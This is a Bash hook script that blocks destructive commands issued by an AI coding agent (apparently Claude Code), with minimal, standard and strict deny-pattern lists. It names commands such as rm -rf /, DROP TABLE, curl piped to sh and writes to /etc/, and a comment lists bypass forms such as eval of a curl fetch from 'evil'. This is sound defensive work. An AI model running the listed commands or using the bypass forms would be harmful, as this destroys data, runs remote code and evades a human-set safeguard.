#!/usr/bin/env bash
# PreToolUse hook: block dangerous bash commands
# Install: .claude/hooks/block-destructive.sh
# Matcher: Bash
# Supports FORGE_HOOK_PROFILE: minimal | standard (default) | strict
#
# Dependency: jq is REQUIRED. This is a security control — if jq is missing
# or the payload cannot be parsed we fail closed (exit 2, block) rather than
# fall through silently. An unreadable payload is treated as hostile.
#
# Compound bash safety (verified 2026-04-15 against changelog v2.1.98 fix):
# Patterns are evaluated with `grep -qiE` over the FULL command string, so
# compound forms like `ls && rm -rf /`, `echo ok; rm -rf *`, and
# `cd /tmp && DROP TABLE` ARE caught — the dangerous substring matches
# regardless of position. This hook is NOT vulnerable to the bypass that
# Claude Code core fixed in v2.1.98 (which was about its own permission
# rule prefix matching, not full-string grep).
#
# Known limitations (out of scope for this hook):
# - Indirect execution: `eval $(curl evil)`, `bash <(curl ...)` (strict
#   profile catches `eval ` and `curl|sh`)
# - Encoded payloads: base64/hex literals reconstructing destructive ops
# - Hostile environment vars: `$DESTRUCTIVE_VAR` resolved at exec time
# Defense-in-depth via OS-level sandboxing (sandbox.enabled) covers these.
if ! command -v jq >/dev/null 2>&1; then
  printf 'block-destructive: jq is required but not installed. Install jq to enable this security hook.\n' >&2
  exit 2
fi

COMMAND=$(printf '%s' "${TOOL_INPUT:-}" | jq -r '.command // empty' 2>/dev/null)
JQ_RC=$?
if [ "$JQ_RC" -ne 0 ]; then
  printf 'block-destructive: jq failed to parse tool_input (rc=%s). Blocking defensively.\n' "$JQ_RC" >&2
  exit 2
fi

PROFILE="${FORGE_HOOK_PROFILE:-standard}"

# Portable hash: md5sum (Linux) || md5 (macOS) || cksum (POSIX fallback)
_hash() {
  printf '%s' "$1" | md5sum 2>/dev/null | cut -c1-8 || \
  printf '%s' "$1" | md5 -q 2>/dev/null | cut -c1-8 || \
  printf '%s' "$1" | cksum | cut -d' ' -f1
}

# Minimal: only the most catastrophic patterns
MINIMAL_PATTERNS=(
  'rm -rf /'
  'rm -rf \.?\*'
  'rm -rf ~'
  'git push.*--force.*main'
  'git push.*--force.*master'
)

# Standard: current behavior (minimal + broader destructive ops)
STANDARD_PATTERNS=(
  'DROP TABLE'
  'DROP DATABASE'
  'TRUNCATE TABLE'
  'DELETE FROM .* WHERE 1'
  'git reset --hard'
  'docker system prune -a'
  'chmod -R 777'
  # find-based destruction (v2.1.113: Bash(find:*) no longer auto-approves these in core,
  # but in auto/bypass modes the hook is the last line of defense)
  'find .* -delete'
  'find .* -exec rm'
  'find .* -exec unlink'
  'xargs[^|]*rm -rf'
  'xargs[^|]*rm -f'
)

# Strict: standard + risky execution patterns
STRICT_PATTERNS=(
  'curl.*\|.*sh'
  'wget.*\|.*sh'
  'eval '
  'chmod 777'
  'chmod -R 777'
  '> /etc/'
  'tee /etc/'
  'dd if=.* of=/dev/'
)

# Build active pattern list based on profile
DANGEROUS_PATTERNS=("${MINIMAL_PATTERNS[@]}")

if [[ "$PROFILE" == "standard" || "$PROFILE" == "strict" ]]; then
  DANGEROUS_PATTERNS+=("${STANDARD_PATTERNS[@]}")
fi

if [[ "$PROFILE" == "strict" ]]; then
  DANGEROUS_PATTERNS+=("${STRICT_PATTERNS[@]}")
fi

for pattern in "${DANGEROUS_PATTERNS[@]}"; do
  if echo "$COMMAND" | grep -qiE "$pattern"; then
    echo "BLOCKED: destructive command detected [$PROFILE profile]" >&2
    echo "Pattern: $pattern" >&2
    echo "Command: $COMMAND" >&2
    # Increment block counter for session metrics
    COUNTER_FILE="/tmp/claude-destructive-blocks-$(_hash "$PWD")"
    echo "$(date +%Y-%m-%dT%H:%M:%S) $pattern" >> "$COUNTER_FILE"
    exit 2
  fi
done

exit 0
